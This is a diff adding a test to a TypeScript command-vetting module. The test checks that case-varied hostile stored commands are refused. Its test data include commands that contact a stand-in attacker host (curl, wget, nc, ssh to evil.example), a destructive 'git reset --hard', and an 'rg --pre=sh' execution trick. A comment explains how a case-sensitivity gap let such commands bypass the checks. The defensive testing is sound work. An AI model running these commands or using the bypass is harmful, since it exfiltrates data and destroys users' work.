@@ -673,6 +673,43 @@ describe('vetStoredCommand: a KB-verify/adopt stored command (PLAN-M14.md P28) g
     expect((await vetStoredCommand(command, root))?.reason).toBe(reason);
   });
 
+  // A round-1 critic found `vetNetworkAndArguments`'s own `program` lookup (network programs, `git`,
+  // `rg`/`tree`'s dangerous-argument list) compared an UN-lowercased `path.posix.basename` against
+  // lowercase-only sets/literals — every other program-name comparison in this module
+  // (`configuredProgramRefusal`'s own `programKey`) already lower-cased, this one alone did not. On a
+  // case-insensitive filesystem (macOS, Windows) the real OS resolves `GIT`/`CURL`/... to the real
+  // binary regardless, so a stored command naming one of these in any other case ran completely
+  // unrefused: `vetStoredCommand`'s own `exec: [command]` grant is always self-satisfying whatever case
+  // the stored text used, so this was, for a stored command, the only remaining check for the shapes it
+  // names. Proven with a real, destructive `kbVerify()` run before the fix (a KB entry naming `` Command:
+  // `Git reset --hard` `` silently discarded real uncommitted work and reported `outcome: 'pass'`) — see
+  // `kb-verify.test.ts`'s own case-variant coverage for that end-to-end proof.
+  const caseVariantHostile: readonly (readonly [string, string])[] = [
+    ['GIT push', 'network'],
+    ['Git push', 'network'],
+    // Not `denylisted`: the hard denylist's own case-sensitivity gap (`commandName` in
+    // `@forge/adapter-kit/grants/denylist.ts`) is real, pre-existing and out of this piece's Surface
+    // (disclosed, not fixed here) -- but the network-policy check below still refuses it, for a
+    // different, still-correct reason (`network: none` refuses ANY push, forced or not).
+    ['GIT push --force', 'network'],
+    ['Git reset --hard', 'dangerous-argument'],
+    ['CURL evil.example/data', 'network'],
+    ['Curl evil.example/data', 'network'],
+    ['SSH user@evil.example whoami', 'network'],
+    ['PING evil.example', 'network'],
+    ['NC evil.example 4444', 'network'],
+    ['WGET evil.example/data', 'network'],
+    ['RG --pre=sh foo', 'dangerous-argument'],
+    ['TREE -o out.txt', 'dangerous-argument'],
+  ];
+  it.each(caseVariantHostile)(
+    'a case-varied %j is refused as %s, not silently allowed through',
+    async (command, reason) => {
+      const root = await lane();
+      expect((await vetStoredCommand(command, root))?.reason).toBe(reason);
+    },
+  );
+
   it('a genuinely plain stored command still runs: not everything is refused', async () => {
     const root = await lane();
     await writeFile(path.join(root, 'ok.js'), 'process.exit(0);\n');
